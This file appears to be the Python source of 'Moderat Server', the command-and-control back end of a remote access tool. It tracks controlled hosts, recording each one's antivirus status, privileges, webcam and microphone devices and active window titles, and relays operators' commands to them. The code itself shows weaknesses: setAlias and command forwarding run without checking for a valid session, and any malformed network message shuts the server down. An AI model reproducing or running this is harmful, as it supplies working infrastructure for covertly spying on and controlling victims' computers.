from twisted.internet.protocol import Protocol, ServerFactory
from twisted.internet import reactor

from ClientsManagment import ClientsManagment
from ModeratorsManagment import ModeratorsManagment

import logging
from logging.handlers import RotatingFileHandler
import sys

import string
import random
import ast
import datetime

LOGFILE = 'server.log'
CLIENTS_PORT = 4434
MODERATORS_PORT = 1313

# Initialize logger
log = logging.getLogger('')
log.setLevel(logging.DEBUG)
format = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")

ch = logging.StreamHandler(sys.stdout)
ch.setFormatter(format)
log.addHandler(ch)

fh = logging.handlers.RotatingFileHandler(LOGFILE, maxBytes=(1048576*5), backupCount=7)
fh.setFormatter(format)
log.addHandler(fh)


manageClients = ClientsManagment()
manageModerators = ModeratorsManagment()

# Clear Clients Status
manageClients.set_status_zero()


def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

clients = {}
moderators = {}

class ModeratServerProtocol(Protocol):

    # New Connection Made
    def connectionMade(self):
        self.send_message_to_client(self, 'connectSuccess', 'welcome')

    def connectionLost(self, reason):
        global clients

        print 'Connection Lost'

        # Delete Socket Entry
        try:
            for key, value in clients.items():
                if value['socket'] == self:
                    # Set Client Online
                    manageClients.set_client_offline(value['key'])
                    del clients[key]
        except KeyError:
            pass


    def dataReceived(self, data):
        # Data Received
        command = self.recieve_message(data)
        # Switch to client commands
        if command['from'] == 'client':
            self.client_commands(command['payload'], command['mode'], command['session_id'])
        # Switch to moderator commands
        elif command['from'] == 'moderator':
            self.moderator_commands(command)

    def client_commands(self, payload, mode, session_id):

        # Clients Initializing
        if mode == 'clientInitializing':

            log.info('Get Key If Exists Or Generate New One')

            # If client has no key generate new one and send
            if payload == 'noKey':
                log.info('Generate New Key')
                client_id = id_generator()

                self.send_message_to_client(self, client_id, 'clientInitializing')

            # else get key from client
            else:
                client_id = payload

            clients[client_id] = {
                'socket': self,
                'status': False,
            }

            log.info('[*] New Client from %s' % self.transport.getHost())

            # Create Client DB Entry
            manageClients.create_client('admin', client_id, self.transport.getHost().host)
            manageClients.set_client_online(client_id)

        # Clients Status Checker
        elif mode == 'infoChecker':
            clients[payload['key']] = {
                'ip_address':           self.transport.getHost().host,
                'os_type':              payload['os_type'],
                'os':                   payload['os'],
                'protection':           payload['protection'],
                'user':                 payload['user'],
                'privileges':           payload['privileges'],
                'audio_device':         payload['audio_device'],
                'webcamera_device':     payload['webcamera_device'],
                'window_title':         payload['window_title'],
                'key':                  payload['key'],
                'socket':               self,
            }

        else:
            log.info('Send Data to Moderator (%s)' % moderators[session_id]['username'])
            self.send_message_to_moderator(moderators[session_id]['socket'], payload, mode)

    def moderator_commands(self, data):

        if data['mode'] == 'moderatorInitializing':

            # Initializing Moderator
            log.info('Initializing Moderator')
            if data['payload'].startswith('auth '):
                if len(data['payload'].split()) == 3:
                    command, username, password = data['payload'].split()

                    # If Login Success
                    if manageModerators.login_user(username, password):

                        privileges = manageModerators.get_privs(username)

                        log.info('Moderator (%s) Login Success' % username)
                        self.send_message_to_moderator(self, 'loginSuccess %s' % privileges, 'moderatorInitializing')

                        # Create Session For Moderator and Save
                        log.info('Create Session for Moderator (%s)' % data['session_id'])
                        moderators[data['session_id']] = {'username': username, 'socket': self}

                        # Set Moderator Last Online
                        manageModerators.set_last_online(username, datetime.datetime.now())
                        # Set Moderator Online Status
                        manageModerators.set_status(username, 1)

                    # if Login Not Success
                    else:
                        log.warning('Moderator (%s) Login Error' % username)
                        self.send_message_to_moderator(self, 'loginError', 'moderatorInitializing')

        # Check if session id is active
        elif data['mode'] == 'getClients' and data['session_id'] in moderators:

            if self.is_administrator(data['session_id']):
                clients_ids = manageClients.get_all_clients()
            else:
                clients_ids = manageClients.get_clients(moderators[data['session_id']]['username'])
            shared_clients = {}

            # for online clients
            for client_id in clients_ids:
                _id = client_id[0]
                # Online Clients
                if clients.has_key(_id) and clients[_id].has_key('os_type'):
                    shared_clients[_id] = {
                        'moderator':            manageClients.get_moderator(_id),
                        'alias':                manageClients.get_alias(_id),
                        'ip_address':           self.transport.getHost().host,
                        'os_type':              clients[_id]['os_type'],
                        'os':                   clients[_id]['os'],
                        'protection':           clients[_id]['protection'],
                        'user':                 clients[_id]['user'],
                        'privileges':           clients[_id]['privileges'],
                        'audio_device':         clients[_id]['audio_device'],
                        'webcamera_device':     clients[_id]['webcamera_device'],
                        'window_title':         clients[_id]['window_title'],
                        'key':                  clients[_id]['key'],
                        'status':               True
                    }
                # Offline Clients
                else:
                    shared_clients[client_id] = {
                        'moderator':    manageClients.get_moderator(_id),
                        'key':           _id,
                        'alias':        manageClients.get_alias(_id),
                        'ip_address':   manageClients.get_ip_address(_id),
                        'last_online':  manageClients.get_last_online(_id),
                        'status':       False
                    }

            self.send_message_to_moderator(self, shared_clients, 'getClients')

        # Set Alias For Client
        elif data['mode'] == 'setAlias':
            alias_client, alias_value = data['payload'].split()
            log.info('Set Alias %s For %s' % (alias_value, data['mode']))
            manageClients.set_alias(alias_client, alias_value)

        # ADMIN PRIVILEGES
        # Get Moderators List
        elif data['mode'] == 'getModerators' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
            all_moderators = manageModerators.get_moderators()
            result = {}
            for moderator in all_moderators:
                all_clients_count = len(ClientsManagment().get_clients(moderator[0]))
                offline_clients_count = len(ClientsManagment().get_offline_clients(moderator[0]))
                result[moderator[0]] = {
                    'privileges': moderator[2],
                    'offline_clients': offline_clients_count,
                    'online_clients': all_clients_count - offline_clients_count,
                    'status': moderator[3],
                    'last_online': moderator[4],
                }
            self.send_message_to_moderator(self, result, 'getModerators')

        # Send Commands To Clients
        else:
            log.info('Send Message to %s from %s' % (data['to'], data['from']))
            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])

    def is_administrator(self, session_id):
        if manageModerators.get_privs(moderators[session_id]['username']) == 1:
            return True
        else:
            return False

    def recieve_message(self, data, end='[ENDOFMESSAGE]'):
        try:
            output = data[:-len(end)].decode('utf-8')
            if end in output:
                output = output.split(end)[0]
            return ast.literal_eval(output)
        except:
            print data
            sys.exit(1)

    def send_message_to_client(self, client, message, mode, _from='server', session_id='', end='[ENDOFMESSAGE]'):
        # Send Data Function
        message = {
            'payload': message,
            'mode': mode,
            'from': _from,
            'session_id': session_id,
        }
        client.transport.write(str(message)+end)

    def send_message_to_moderator(self, moderator, message, mode, _from='server', end='[ENDOFMESSAGE]'):
        message = {
            'payload': message,
            'mode': mode,
            'from': _from,
            'to': '',
        }
        moderator.transport.write(str(message)+end)


class ModeratServerFactory(ServerFactory):

    log.info('Moderat Server Started')

    protocol = ModeratServerProtocol

    def __init__(self):
        pass


reactor.listenTCP(CLIENTS_PORT, ModeratServerFactory())
log.info('Set Clients Port to %s' % str(CLIENTS_PORT))
reactor.listenTCP(MODERATORS_PORT, ModeratServerFactory())
log.info('Set Moderators Port to %s' % str(MODERATORS_PORT))
reactor.run()